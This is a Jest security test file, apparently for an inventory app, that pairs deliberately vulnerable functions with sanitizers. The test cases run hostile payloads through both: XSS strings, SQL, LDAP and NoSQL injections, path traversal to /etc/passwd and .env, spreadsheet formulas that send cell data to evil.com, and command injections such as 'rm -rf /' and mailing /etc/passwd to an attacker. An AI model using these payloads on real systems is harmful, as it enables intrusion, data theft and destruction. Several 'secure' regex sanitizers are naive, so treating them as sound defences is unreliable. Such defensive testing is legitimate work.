import { describe, test, expect } from '@jest/globals';
import { PrismaClient } from '@prisma/client';

const prisma = new PrismaClient();

describe('Input Validation & Security Vulnerabilities', () => {
  test('XSS vulnerability detection in batch names', async () => {
    const maliciousBatchNames = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      'javascript:alert("XSS")',
      '<svg onload=alert("XSS")>',
      '"><script>alert(String.fromCharCode(88,83,83))</script>',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<input onfocus=alert("XSS") autofocus>',
      '<select onfocus=alert("XSS") autofocus>',
      '<textarea onfocus=alert("XSS") autofocus>',
      '<body onload=alert("XSS")>'
    ];

    // Vulnerable implementation
    const vulnerableSanitizeInput = (input: string) => {
      // BUG: No sanitization implemented
      return input;
    };

    // Secure implementation
    const secureSanitizeInput = (input: string) => {
      // Remove script tags
      let sanitized = input.replace(/<script[^>]*>.*?<\/script>/gi, '');
      // Remove event handlers
      sanitized = sanitized.replace(/on\w+\s*=\s*["'][^"']*["']/gi, '');
      sanitized = sanitized.replace(/on\w+\s*=\s*[^\s>]*/gi, '');
      // Remove javascript: protocol
      sanitized = sanitized.replace(/javascript:/gi, '');
      // Remove dangerous tags
      sanitized = sanitized.replace(/<(script|iframe|object|embed|link|style|base|meta)[^>]*>/gi, '');
      return sanitized;
    };

    for (const maliciousInput of maliciousBatchNames) {
      const vulnerableResult = vulnerableSanitizeInput(maliciousInput);
      const secureResult = secureSanitizeInput(maliciousInput);
      
      // Vulnerable implementation leaves dangerous content
      const hasXSS = 
        vulnerableResult.includes('<script') ||
        vulnerableResult.includes('javascript:') ||
        vulnerableResult.includes('onerror=') ||
        vulnerableResult.includes('onload=') ||
        vulnerableResult.includes('onfocus=');
      
      expect(hasXSS).toBe(true);
      
      // Secure implementation removes dangerous content
      expect(secureResult).not.toContain('<script');
      expect(secureResult).not.toContain('javascript:');
      expect(secureResult).not.toContain('onerror=');
      expect(secureResult).not.toContain('onload=');
      expect(secureResult).not.toContain('onfocus=');
    }
  });

  test('SQL injection vulnerability detection in search queries', async () => {
    const maliciousQueries = [
      "'; DROP TABLE inventory; --",
      "1' OR '1'='1",
      "admin'--",
      "1' UNION SELECT * FROM users--",
      "'; UPDATE users SET role='admin' WHERE email='attacker@example.com'--",
      "' OR 1=1; DELETE FROM warehouses; --"
    ];

    // Vulnerable implementation
    const vulnerableBuildSearchQuery = (searchTerm: string) => {
      // BUG: Direct string concatenation
      return `SELECT * FROM inventory WHERE name LIKE '%${searchTerm}%'`;
    };

    // Secure implementation
    const secureBuildSearchQuery = (searchTerm: string) => {
      // Use parameterized query (simulated)
      // The parameter is passed as-is to the database driver
      // which will handle escaping properly
      return {
        query: "SELECT * FROM inventory WHERE name LIKE ?",
        params: [`%${searchTerm}%`]
      };
    };

    for (const maliciousInput of maliciousQueries) {
      const vulnerableQuery = vulnerableBuildSearchQuery(maliciousInput);
      const secureQuery = secureBuildSearchQuery(maliciousInput);
      
      // Vulnerable query contains dangerous SQL
      const hasSQLInjection = 
        /DROP\s+TABLE/i.test(vulnerableQuery) ||
        /UNION\s+SELECT/i.test(vulnerableQuery) ||
        /UPDATE\s+users/i.test(vulnerableQuery) ||
        /DELETE\s+FROM/i.test(vulnerableQuery) ||
        /OR\s+1\s*=\s*1/i.test(vulnerableQuery);
      
      expect(hasSQLInjection).toBe(true);
      
      // Secure implementation prevents injection
      expect(secureQuery.query).not.toMatch(/DROP\s+TABLE/i);
      expect(secureQuery.query).not.toMatch(/UNION\s+SELECT/i);
      expect(secureQuery.params[0]).not.toMatch(/DROP\s+TABLE/i);
    }
  });

  test('Excel formula injection prevention in exports', async () => {
    const maliciousFormulas = [
      '=1+1',
      '=cmd|"/c calc"!A1',
      '@SUM(1+1)*cmd|"/c calc"!A1',
      '=2+5+cmd|"/c calc"!A1',
      '=HYPERLINK("http://evil.com?data="&A1&A2)',
      '=IMPORTXML(CONCAT("http://evil.com?v=", CONCATENATE(A1:A50)))',
      '+1+1',
      '-1+1',
      '@SUM(A1:A10)',
      '=10+20+cmd|\'/c notepad\'!A1'
    ];

    // Vulnerable implementation
    const vulnerableSanitizeForExcel = (value: string) => {
      // BUG: No Excel formula injection prevention
      return value;
    };

    // Secure implementation
    const secureSanitizeForExcel = (value: string) => {
      if (typeof value !== 'string') return value;
      
      // Prefix formula characters with single quote
      if (/^[=+\-@]/.test(value)) {
        return "'" + value;
      }
      
      // Remove dangerous functions
      let sanitized = value;
      sanitized = sanitized.replace(/IMPORTXML/gi, '');
      sanitized = sanitized.replace(/HYPERLINK/gi, '');
      sanitized = sanitized.replace(/cmd\|/gi, '');
      
      return sanitized;
    };

    for (const formula of maliciousFormulas) {
      const vulnerableResult = vulnerableSanitizeForExcel(formula);
      const secureResult = secureSanitizeForExcel(formula);
      
      // Vulnerable implementation leaves formulas intact
      const hasFormula = /^[=+\-@]/.test(vulnerableResult);
      expect(hasFormula).toBe(true);
      
      // Secure implementation prevents formula execution
      if (formula.startsWith('=') || formula.startsWith('+') || formula.startsWith('-') || formula.startsWith('@')) {
        expect(secureResult.startsWith("'")).toBe(true);
      }
      // These dangerous patterns should be removed even with prefix
      if (formula.includes('cmd|') || formula.includes('IMPORTXML')) {
        expect(secureResult).not.toContain('cmd|');
        expect(secureResult).not.toContain('IMPORTXML');
      }
    }
  });

  test('Path traversal vulnerability detection in file operations', async () => {
    const maliciousPaths = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      'uploads/../../../sensitive-data.xlsx',
      'reports/../../../../app/.env',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '....//....//....//etc/passwd',
      '..;/..;/..;/etc/passwd'
    ];

    // Vulnerable implementation
    const vulnerableValidateFilePath = (path: string) => {
      // BUG: Insufficient path validation
      return !path.includes('../');
    };

    // Secure implementation
    const secureValidateFilePath = (path: string) => {
      // Decode URL encoding first
      let decodedPath = path;
      try {
        decodedPath = decodeURIComponent(path);
      } catch (e) {
        return false; // Invalid encoding
      }
      
      // Check for various path traversal patterns
      const patterns = [
        /\.\./,
        /\.\.\\/,
        /\.\.;/,
        /\.{4,}/,
        /%2e/i,
        /%5c/i
      ];
      
      for (const pattern of patterns) {
        if (pattern.test(decodedPath)) {
          return false;
        }
      }
      
      // Ensure path doesn't go outside allowed directory
      const normalizedPath = path.replace(/\\/g, '/');
      if (normalizedPath.startsWith('/') || normalizedPath.includes(':')) {
        return false;
      }
      
      return true;
    };

    // Test cases that vulnerable implementation misses
    const trickyPaths = [
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '....//....//....//etc/passwd',
      '..;/..;/..;/etc/passwd'
    ];

    for (const path of trickyPaths) {
      const vulnerableResult = vulnerableValidateFilePath(path);
      const secureResult = secureValidateFilePath(path);
      
      // Vulnerable implementation misses encoded/obfuscated traversal attempts
      // (it only checks for simple ../ pattern)
      if (path.includes('%2e') || path.includes('....') || path.includes('..;')) {
        expect(vulnerableResult).toBe(true); // Doesn't catch these
      }
      // Secure implementation catches all traversal attempts
      expect(secureResult).toBe(false);
    }
  });

  test('File type validation - detects missing MIME type checks', async () => {
    const dangerousFiles = [
      { fullName: 'malware.exe', type: 'application/x-msdownload' },
      { fullName: 'script.js', type: 'text/javascript' },
      { fullName: 'shell.sh', type: 'application/x-sh' },
      { fullName: 'macro.xlsm', type: 'application/vnd.ms-excel.sheet.macroEnabled.12' },
      { fullName: 'virus.bat', type: 'application/x-bat' },
      { fullName: 'exploit.jsp', type: 'application/x-jsp' }
    ];

    // Vulnerable implementation
    const vulnerableValidateFileUpload = (fileName: string, mimeType: string) => {
      // BUG: Only checks file extension, not MIME type
      const allowedExtensions = ['.xlsx', '.csv', '.xls'];
      return allowedExtensions.some(ext => fileName.endsWith(ext));
    };

    // Secure implementation
    const secureValidateFileUpload = (fileName: string, mimeType: string) => {
      const allowedExtensions = ['.xlsx', '.csv', '.xls'];
      const allowedMimeTypes = [
        'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
        'application/vnd.ms-excel',
        'text/csv'
      ];
      
      const hasValidExtension = allowedExtensions.some(ext => fileName.toLowerCase().endsWith(ext));
      const hasValidMimeType = allowedMimeTypes.includes(mimeType);
      
      return hasValidExtension && hasValidMimeType;
    };

    // Test file with valid extension but dangerous MIME type
    const disguisedFile = {
      fullName: 'malware.xlsx',
      type: 'application/x-msdownload'
    };

    const vulnerableResult = vulnerableValidateFileUpload(disguisedFile.fullName, disguisedFile.type);
    const secureResult = secureValidateFileUpload(disguisedFile.fullName, disguisedFile.type);
    
    // Vulnerable implementation incorrectly accepts disguised file
    expect(vulnerableResult).toBe(true);
    // Secure implementation correctly rejects it
    expect(secureResult).toBe(false);
  });

  test('Integer overflow detection in quantity calculations', async () => {
    // Vulnerable implementation
    const vulnerableCalculateTotal = (quantity: number, price: number) => {
      // BUG: No bounds checking
      return quantity * price;
    };

    // Secure implementation
    const secureCalculateTotal = (quantity: number, price: number) => {
      // Check inputs are safe
      if (!Number.isSafeInteger(quantity) || !Number.isSafeInteger(price)) {
        throw new Error('Invalid input: numbers too large');
      }
      
      // Check if result would overflow
      if (quantity > 0 && price > 0) {
        if (quantity > Number.MAX_SAFE_INTEGER / price) {
          throw new Error('Calculation would overflow');
        }
      }
      
      return quantity * price;
    };

    // JavaScript's MAX_SAFE_INTEGER
    const maxSafeInt = Number.MAX_SAFE_INTEGER;
    const largeQuantity = maxSafeInt;
    const price = 2;

    // Test vulnerable implementation
    const vulnerableTotal = vulnerableCalculateTotal(largeQuantity, price);
    
    // Vulnerable implementation allows overflow
    expect(vulnerableTotal).toBeGreaterThan(maxSafeInt);
    expect(Number.isSafeInteger(vulnerableTotal)).toBe(false);
    
    // Test secure implementation
    let errorCaught = false;
    try {
      secureCalculateTotal(largeQuantity, price);
    } catch (error) {
      errorCaught = true;
    }
    
    // Secure implementation prevents overflow
    expect(errorCaught).toBe(true);
  });

  test('Unicode and special character handling validation', async () => {
    const problematicInputs = [
      'ð•³ð–Šð–‘ð–‘ð–”', // Unicode mathematical alphanumeric symbols
      'ä½ å¥½ä¸–ç•ŒðŸŒ', // Mixed scripts with emoji
      '\u202E\u0048\u0065\u006C\u006C\u006F', // Right-to-left override
      'A\u0000B', // Null byte injection
      'ï¼œscriptï¼žalert("XSS")ï¼œ/scriptï¼ž', // Full-width characters
      String.fromCharCode(8238) + 'data', // Invisible characters
      'â€‹â€‹â€‹â€‹â€‹secret', // Zero-width spaces
    ];

    // Vulnerable implementation
    const vulnerableValidateAndNormalize = (input: string) => {
      // BUG: No Unicode normalization or special character handling
      return input.trim();
    };

    // Secure implementation
    const secureValidateAndNormalize = (input: string) => {
      // Remove null bytes
      let sanitized = input.replace(/\u0000/g, '');
      
      // Remove RTL and other directional overrides
      sanitized = sanitized.replace(/[\u202A-\u202E]/g, '');
      
      // Remove zero-width and invisible characters
      sanitized = sanitized.replace(/[\u200B-\u200F]/g, '');
      sanitized = sanitized.replace(/[\u2060-\u206F]/g, '');
      
      // Normalize to NFC
      if (sanitized.normalize) {
        sanitized = sanitized.normalize('NFC');
      }
      
      return sanitized.trim();
    };

    for (const input of problematicInputs) {
      const vulnerableResult = vulnerableValidateAndNormalize(input);
      const secureResult = secureValidateAndNormalize(input);
      
      // Check vulnerable implementation leaves problematic characters
      const hasProblematicChars = 
        vulnerableResult.includes('\u0000') ||
        vulnerableResult.includes('\u202E') ||
        /[\u200B-\u200F\u202A-\u202E]/.test(vulnerableResult);
      
      // At least some inputs should have problematic characters
      if (input.includes('\u0000') || input.includes('\u202E') || /[\u200B-\u200F]/.test(input)) {
        expect(hasProblematicChars).toBe(true);
      }
      
      // Secure implementation removes them
      expect(secureResult).not.toContain('\u0000');
      expect(secureResult).not.toContain('\u202E');
      expect(secureResult).not.toMatch(/[\u200B-\u200F\u202A-\u202E]/);
    }
  });

  test('LDAP injection vulnerability detection', async () => {
    const maliciousLdapInputs = [
      '*)(uid=*',
      'admin)(&(password=*)',
      '*)(|(uid=*',
      'admin)(|(password=*)(uid=*))',
      '\\2a\\28\\7c\\28\\75\\69\\64\\3d\\2a\\29'
    ];

    // Vulnerable implementation
    const vulnerableBuildLdapQuery = (username: string) => {
      // BUG: No LDAP escaping
      return `(&(objectClass=user)(uid=${username}))`;
    };

    // Secure implementation
    const secureBuildLdapQuery = (username: string) => {
      // Escape special LDAP characters
      const escaped = username
        .replace(/\\/g, '\\5c')
        .replace(/\*/g, '\\2a')
        .replace(/\(/g, '\\28')
        .replace(/\)/g, '\\29')
        .replace(/\u0000/g, '\\00')
        .replace(/\//g, '\\2f');
      
      return `(&(objectClass=user)(uid=${escaped}))`;
    };

    for (const input of maliciousLdapInputs) {
      const vulnerableQuery = vulnerableBuildLdapQuery(input);
      const secureQuery = secureBuildLdapQuery(input);
      
      // Check if vulnerable query contains dangerous patterns
      const hasInjection = 
        vulnerableQuery.includes('*)(') ||
        vulnerableQuery.includes('|(') ||
        vulnerableQuery.includes(')(&') ||
        vulnerableQuery.includes('*)') ||
        (vulnerableQuery.match(/\(/g) || []).length > 2 || // Multiple parentheses
        (vulnerableQuery.match(/\)/g) || []).length > 2;
      
      // At least some of the inputs should create injection
      if (input.includes('*') || input.includes('(') || input.includes(')') || input.includes('|')) {
        expect(vulnerableQuery).toContain(input); // Input is passed as-is
      }
      
      // Secure query escapes special characters
      expect(secureQuery).not.toContain('*)(');
      expect(secureQuery).not.toContain('|(');
      expect(secureQuery).not.toContain(')(&');
    }
  });

  test('Command injection vulnerability detection', async () => {
    const maliciousCommands = [
      'file.xlsx; rm -rf /',
      'report.csv && cat /etc/passwd',
      'data.xlsx | mail attacker@evil.com < /etc/passwd',
      '$(cat /etc/passwd)',
      '`cat /etc/passwd`',
      'file.xlsx\ncat /etc/passwd'
    ];

    // Vulnerable implementation
    const vulnerableProcessFile = (fileName: string) => {
      // BUG: Unsafe command construction
      return `process_excel ${fileName}`;
    };

    // Secure implementation
    const secureProcessFile = (fileName: string) => {
      // Remove shell metacharacters
      const sanitized = fileName
        .replace(/[;&|`$\n<>(){}\[\]]/g, '')
        .replace(/\\/g, '');
      
      // Use array format for command (simulated)
      return ['process_excel', sanitized];
    };

    for (const input of maliciousCommands) {
      const vulnerableCommand = vulnerableProcessFile(input);
      const secureCommand = secureProcessFile(input);
      
      // Vulnerable command contains dangerous characters
      const hasInjection = 
        /[;&|`$\n]/.test(vulnerableCommand) ||
        vulnerableCommand.includes('rm ') ||
        vulnerableCommand.includes('cat ') ||
        vulnerableCommand.includes('mail ');
      
      expect(hasInjection).toBe(true);
      
      // Secure command sanitizes input
      const secureCommandStr = Array.isArray(secureCommand) ? secureCommand.join(' ') : secureCommand;
      expect(secureCommandStr).not.toMatch(/[;&|`$\n]/);
      // Commands might still contain 'rm', 'cat', 'mail' as part of the filename after sanitization
      // What matters is that shell metacharacters are removed
      expect(secureCommandStr).not.toContain('; rm');
      expect(secureCommandStr).not.toContain('&& cat');
      expect(secureCommandStr).not.toContain('| mail');
    }
  });

  test('NoSQL injection vulnerability detection', async () => {
    const maliciousNoSqlInputs = [
      { $ne: null },
      { $gt: "" },
      { $regex: ".*" },
      { password: { $ne: 1 } },
      { $where: "this.password == this.password" }
    ];

    // Vulnerable implementation
    const vulnerableBuildQuery = (userInput: any) => {
      // BUG: Directly uses user input in query
      return {
        username: userInput,
        isActive: true
      };
    };

    // Secure implementation
    const secureBuildQuery = (userInput: any) => {
      // Ensure input is a string
      const sanitizedInput = typeof userInput === 'string' ? userInput : String(userInput);
      
      // Remove any object/operator patterns
      if (typeof userInput === 'object' && userInput !== null) {
        return {
          username: '',
          isActive: true
        };
      }
      
      return {
        username: sanitizedInput,
        isActive: true
      };
    };

    for (const input of maliciousNoSqlInputs) {
      const vulnerableQuery = vulnerableBuildQuery(input);
      const secureQuery = secureBuildQuery(input);
      
      // Vulnerable query allows operator injection
      const vulnerableQueryStr = JSON.stringify(vulnerableQuery);
      const hasInjection = 
        vulnerableQueryStr.includes('$ne') ||
        vulnerableQueryStr.includes('$gt') ||
        vulnerableQueryStr.includes('$regex') ||
        vulnerableQueryStr.includes('$where');
      
      expect(hasInjection).toBe(true);
      
      // Secure query prevents operator injection
      const secureQueryStr = JSON.stringify(secureQuery);
      expect(secureQueryStr).not.toContain('$ne');
      expect(secureQueryStr).not.toContain('$gt');
      expect(secureQueryStr).not.toContain('$regex');
      expect(secureQueryStr).not.toContain('$where');
    }
  });
});